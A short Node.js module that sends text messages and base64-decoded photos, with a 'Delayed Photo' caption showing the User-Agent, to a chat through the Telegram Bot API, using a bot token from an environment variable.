const axios = require("axios");
const FormData = require("form-data");

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_TOKEN_BOT;

const sendMessage = async (chatId, message) => {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: "Markdown",
        });
        console.log("✅ Message sent to Telegram.");
    } catch (err) {
        console.log("❌ Error sending message:", err.message);
    }
}

const sendPhoto = async (chatId, photo, userAgent) => {
    try {
        const base64Data = photo.replace(/^data:image\/\w+;base64,/, "");
        const imageBuffer = Buffer.from(base64Data, "base64");

        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("caption", `📸 Delayed Photo\nUser-Agent: ${userAgent}`);
        formData.append("photo", imageBuffer, {
            filename: `photo.jpg`,
            contentType: "image/jpeg"
        });

        await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
            formData,
            { headers: formData.getHeaders() }
        );

        console.log("✅ Photo sent to Telegram.");
    } catch (err) {
        console.log("❌ Error sending photo:", err.message);
    }
}

module.exports = {
    sendMessage,
    sendPhoto,
};